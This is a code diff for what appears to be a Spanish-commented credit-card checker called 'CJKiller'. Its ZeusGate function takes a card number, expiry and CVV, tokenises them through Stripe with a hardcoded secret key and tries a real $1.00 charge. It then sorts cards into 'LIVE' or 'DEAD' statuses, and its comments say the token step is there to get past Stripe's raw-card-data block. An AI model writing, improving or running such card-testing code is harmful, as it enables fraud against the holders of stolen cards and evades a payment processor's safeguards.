@@ -85,39 +85,54 @@ class ChaosGate:
             return {"status": "ERROR ⚠️", "msg": "Gate Timeout", "raw": {}}
 
 
+
 class ZeusGate:
-    
+    """GATEWAY ZEUS - CARGO REAL DE $1 USD (MODO TOKENS)"""
     @staticmethod
-    def check_zeus(cc, mm, yy, cvv):  
-        sk = "sk_test_51Shy26APuGnFVpIFWGs3l4ZnoWSuNTK5Jle8FtO4N5e4J5GGFxPEjrGpUPkVsZkjFAhlSIAES22bSnvCTgYM56eG00FGF2Bxcx" 
+    def check_zeus(cc, mm, yy, cvv):
+        # TU LLAVE COMPLETA YA ESTÁ AQUÍ
+        sk = "sk_test_51Shy26APuGnFVpIFWGs3l4ZnoWSuNTK5Jle8FtO4N5e4J5GGFxPEjrGpUPkVsZkjFAhlSIAES22bSnvCTgYM56eG00FGF2Bxcx"
         
         try:
-            # 1. Crear el Token para la transacción
+            # 1. CREAR TOKEN (Para saltar el bloqueo de "Unsafe Raw Card Data")
             r_token = requests.post(
                 'https://api.stripe.com/v1/tokens',
-                data={'card[number]': cc, 'card[cvc]': cvv, 'card[exp_month]': mm, 'card[exp_year]': yy},
+                data={
+                    'card[number]': cc,
+                    'card[cvc]': cvv,
+                    'card[exp_month]': mm,
+                    'card[exp_year]': yy
+                },
                 auth=(sk, ''), timeout=15
             )
-            tok = r_token.json().get('id')
+            token_data = r_token.json()
+            tok = token_data.get('id')
 
             if not tok:
-                return {"status": "DEAD ❌", "msg": r_token.json().get('error', {}).get('message', 'Invalid')}
+                err = token_data.get('error', {}).get('message', 'Tarjeta Inválida')
+                return {"status": "DEAD ❌", "msg": err}
 
-            # 2. INTENTO DE CARGO REAL DE $1.00 USD
+            # 2. INTENTO DE CARGO DE $1.00 USD
             r_charge = requests.post(
                 'https://api.stripe.com/v1/charges',
-                data={'amount': 100, 'currency': 'usd', 'source': tok, 'description': 'CJKiller Zeus Charge'},
+                data={
+                    'amount': 100, # $1.00
+                    'currency': 'usd',
+                    'source': tok,
+                    'description': 'CJKiller Zeus Real Check'
+                },
                 auth=(sk, ''), timeout=15
             )
             res = r_charge.json()
 
-            # --- FILTRO DE RESPUESTA REAL ---
+            # --- FILTRO DE RESPUESTAS REALES DEL BANCO ---
             if res.get('paid') == True:
                 return {"status": "LIVE ✅ (Charged $1)", "msg": "Transaction Successful"}
             elif "insufficient_funds" in str(res).lower():
                 return {"status": "LIVE 🟢 (Low Funds)", "msg": "Insufficient Funds"}
             else:
-                return {"status": "DEAD ❌", "msg": res.get('error', {}).get('message', 'Declined')}
+                err_msg = res.get('error', {}).get('message', 'Declined')
+                return {"status": "DEAD ❌", "msg": err_msg}
 
         except Exception as e:
             return {"status": "ERROR ⚠️", "msg": f"System Error: {str(e)}"}
